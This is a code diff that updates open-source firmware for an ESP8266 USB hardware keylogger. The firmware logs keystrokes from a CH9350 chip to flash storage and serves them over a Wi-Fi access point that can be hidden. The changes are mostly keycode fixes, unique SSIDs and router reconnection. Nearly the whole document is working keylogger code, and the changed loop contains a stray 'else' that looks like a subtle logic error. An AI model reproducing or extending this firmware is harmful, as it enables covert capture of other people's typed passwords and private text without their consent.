@@ -1,12 +1,13 @@
 /************************************** INFO ***********************************
-* File Name          : USBkeylogger.ino
-* Author             : PushEAX
-* Version            : V1.1
-* Date               : 2022-11-13
-* Last Modified      : 2023-11-22
-* Description        : USBKeylogger V1/V2 Firmware
-*                      1. Serial read CH9350 messages, parse key value data, save to SPIFFS
-*                      2. Web interface / configuration page / OTA upgrade
+* File Name         : USBkeylogger.ino
+* Author            : PushEAX
+* Version           : V1.2
+* Date              : 2022-11-13
+* Last Modified     : 2025-10-02
+* Description       : USBKeylogger V1/V2 Firmware
+* 1. Serial read CH9350 messages, parse key value data, save to SPIFFS
+* 2. Web interface / configuration page / OTA upgrade
+* 3. Default SSID with MAC address / Improved AP stability
 *******************************************************************************/
 #include <FS.h>
 #include <ESP8266WiFi.h>
@@ -18,20 +19,25 @@
 #include "html.h"
 
 // =======Config=======
-String Version = "1.1";
+String Version = "1.2";
 String logFile_Path = "/keyLog.txt";
 String configFile_Path = "/config.json";
 IPAddress IPAddr(192, 168, 5, 1);
 IPAddress subnet(255, 255, 255, 0);
 AsyncWebServer webServer(80); // Web server bound to port 80
+
 struct Config {
-  const char *AP_SSID = "USBKeylogger";
-  const char *AP_password = "12345678";
-  const char *AP_hidssid = "0";
-  const char *STA_SSID = "Your_Router_SSID";
-  const char *STA_password = "Your_Router_Password";
+  String AP_SSID = "USBKeylogger";
+  String AP_password = "12345678";
+  String AP_hidssid = "0";
+  String STA_SSID = "Your_Router_SSID";
+  String STA_password = "Your_Router_Password";
 };
 Config cfg;
+
+unsigned long lastReconnectAttempt = 0;
+const long reconnectInterval = 60000; // 60s Wi-Fi STA Reconnect Interval
+
 // =======Config=======
 
 FSInfo SPIFFS_Info;
@@ -54,6 +60,13 @@ void setup() {
   logFile.print("==boot==\n");
 
   if (!SPIFFS.exists(configFile_Path)){ // If the configuration file does not exist, write out the default cfg
+    // Generate a unique SSID on the first boot
+    String mac = WiFi.macAddress();
+    mac.replace(":", "");
+    String uniqueID = mac.substring(6); // Get the last 6 characters of the MAC address
+    cfg.AP_SSID += "_";
+    cfg.AP_SSID += uniqueID;
+
     DynamicJsonDocument doc(512);
     JsonObject root = doc.to<JsonObject>();
     root["AP_SSID"] = cfg.AP_SSID;
@@ -74,11 +87,11 @@ void setup() {
     if (doc.containsKey("AP_SSID") && doc.containsKey("AP_password") &&
         doc.containsKey("AP_hidssid") && doc.containsKey("STA_SSID") &&
         doc.containsKey("STA_password")) {
-      cfg.AP_SSID = doc["AP_SSID"];
-      cfg.AP_password = doc["AP_password"];
-      cfg.AP_hidssid = doc["AP_hidssid"];
-      cfg.STA_SSID = doc["STA_SSID"];
-      cfg.STA_password = doc["STA_password"];
+      cfg.AP_SSID = doc["AP_SSID"].as<String>();
+      cfg.AP_password = doc["AP_password"].as<String>();
+      cfg.AP_hidssid = doc["AP_hidssid"].as<String>();
+      cfg.STA_SSID = doc["STA_SSID"].as<String>();
+      cfg.STA_password = doc["STA_password"].as<String>();
     }else{
       SPIFFS.remove(configFile_Path);
       ESP.restart();
@@ -97,10 +110,22 @@ void loop() {
     delay(100);
     ESP.restart();
   }
+  
+
+  if (WiFi.status() != WL_CONNECTED && cfg.STA_SSID != "Your_Router_SSID") {
+    unsigned long currentMillis = millis();
+    if (currentMillis - lastReconnectAttempt >= reconnectInterval) {
+      lastReconnectAttempt = currentMillis;
+      Serial.println("WiFi disconnected. Attempting to reconnect...");
+      WiFi.reconnect();
+    }
+  }
+  else
+
   //CH9350 Key Data Example:57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
-  if (Serial.read() == 0x12){
+  if (Serial.available() > 0 && Serial.read() == 0x12){
     delay(5);
-    if (Serial.read() == 0x01){
+    if (Serial.available() > 0 && Serial.read() == 0x01){
       delay(5);
       for (int i=0;i<7;i++){
         CH9350HidData_Old[i]=CH9350HidData[i];
@@ -118,9 +143,10 @@ void loop() {
 void startWiFi(){
   WiFi.mode(WIFI_AP_STA);
   WiFi.hostname("USBKeylogger");
+  WiFi.setAutoReconnect(false);
   WiFi.softAPConfig(IPAddr, IPAddr, subnet);
-  WiFi.softAP(cfg.AP_SSID,cfg.AP_password,2,(int)cfg.AP_hidssid); // Channel 2
-  WiFi.begin(cfg.STA_SSID,cfg.STA_password);
+  WiFi.softAP(cfg.AP_SSID.c_str(), cfg.AP_password.c_str(), 2, cfg.AP_hidssid.toInt()); // Channel 2
+  WiFi.begin(cfg.STA_SSID.c_str(), cfg.STA_password.c_str());
 }
 
 void startWebInterface(){
@@ -217,13 +243,13 @@ String templateProcessor(const String& var) { // Process HTML template strings
     File configFile = SPIFFS.open(configFile_Path, "r");
     deserializeJson(doc, configFile);
     configFile.close();
-   
-  if(var == "AP_SSID") return doc["AP_SSID"];
-  if(var == "AP_password") return doc["AP_password"];
+    
+  if(var == "AP_SSID") return doc["AP_SSID"].as<String>();
+  if(var == "AP_password") return doc["AP_password"].as<String>();
   if(var == "SHOWSSID") return (doc["AP_hidssid"] == "1")?"":"checked";
   if(var == "HIDSSID") return (doc["AP_hidssid"] == "1")?"checked":"";
-  if(var == "STA_SSID") return doc["STA_SSID"];
-  if(var == "STA_password") return doc["STA_password"];
+  if(var == "STA_SSID") return doc["STA_SSID"].as<String>();
+  if(var == "STA_password") return doc["STA_password"].as<String>();
   if(var == "FIRMWAREVERSION") return Version;
   
   return var;
@@ -259,7 +285,7 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           if (!capslock && !shift) strcat(result,"a");  // Lowercase if caps lock is off and shift is not pressed
           if (!capslock && shift) strcat(result,"A");   // Uppercase if only shift is pressed
           if (capslock && !shift) strcat(result,"A");   // Uppercase if only caps lock is on
-          if (capslock && shift) strcat(result,"a");    // Lowercase if both caps lock is on and shift is pressed
+          if (capslock && shift) strcat(result,"a");   // Lowercase if both caps lock is on and shift is pressed
           break;
         case 0x05:
           if (!capslock && !shift) strcat(result,"b");
@@ -411,7 +437,7 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           if (capslock && !shift) strcat(result,"Z");
           if (capslock && shift) strcat(result,"z");
           break;
-      
+        
         case 0x1E:
           if(shift) strcat(result,"!");
           else strcat(result,"1");
@@ -450,7 +476,7 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           break;
         case 0x27:
           if(shift) strcat(result,")");
-          else strcat(result,"10");
+          else strcat(result,"0"); // Corrected 10 to 0
           break;
         case 0x28:strcat(result,"[Enter]\n");
           break;
@@ -479,7 +505,7 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           else strcat(result,"]");
           break;
         case 0x31:
-          if(shift) strcat(result,"(|");
+          if(shift) strcat(result,"|");
           else strcat(result,"\\");
           break;
         case 0x32:
@@ -492,11 +518,11 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           break;
         case 0x34:
           if(shift) strcat(result,"\"");
-          else strcat(result,"\"");
+          else strcat(result,"\'");
           break;
         case 0x35:
-          if(shift) strcat(result,"`");
-          else strcat(result,"~");
+          if(shift) strcat(result,"~");
+          else strcat(result,"`");
           break;
         case 0x36:
           if(shift) strcat(result,"<");
@@ -510,37 +536,37 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           if(shift) strcat(result,"?");
           else strcat(result,"/");
           break;
-      
-      
+        
+        
         case 0x39:strcat(result,"[Capslock]");
           break;
         case 0x3A:strcat(result,"[F1]");
-          break;               
+          break;                  
         case 0x3B:strcat(result,"[F2]");
-          break;               
+          break;                  
         case 0x3C:strcat(result,"[F3]");
-          break;               
+          break;                  
         case 0x3D:strcat(result,"[F4]");
-          break;               
+          break;                  
         case 0x3E:strcat(result,"[F5]");
-          break;               
+          break;                  
         case 0x3F:strcat(result,"[F6]");
-          break;               
+          break;                  
         case 0x40:strcat(result,"[F7]");
-          break;               
+          break;                  
         case 0x41:strcat(result,"[F8]");
-          break;               
+          break;                  
         case 0x42:strcat(result,"[F9]");
-          break;               
+          break;                  
         case 0x43:strcat(result,"[F10]");
-          break;               
+          break;                  
         case 0x44:strcat(result,"[F11]");
-          break;               
+          break;                  
         case 0x45:strcat(result,"[F12]");
           break;
         case 0x46:strcat(result,"[PrintScreen]");
           break;
-        case 0x47:strcat(result,"[Scolllock]");
+        case 0x47:strcat(result,"[ScrollLock]");
           break;
         case 0x48:strcat(result,"[Pause]");
           break;
@@ -548,13 +574,13 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           break;
         case 0x4A:strcat(result,"[Home]");
           break;
-        case 0x4B:strcat(result,"[Pageup]");
+        case 0x4B:strcat(result,"[PageUp]");
           break;
         case 0x4C:strcat(result,"[Del]");
           break;
         case 0x4D:strcat(result,"[End]");
           break;
-        case 0x4E:strcat(result,"[Pagedown]");
+        case 0x4E:strcat(result,"[PageDown]");
           break;
         case 0x4F:strcat(result,"[Right]");
           break;
@@ -564,7 +590,7 @@ void HID2ASCII(int* HIDData_old,int* HIDData,bool capslock,char* result)
           break;
         case 0x52:strcat(result,"[Up]");
           break;
-        case 0x53:strcat(result,"[Numlock]");
+        case 0x53:strcat(result,"[NumLock]");
           break;
         case 0x54:strcat(result,"/");
           break;
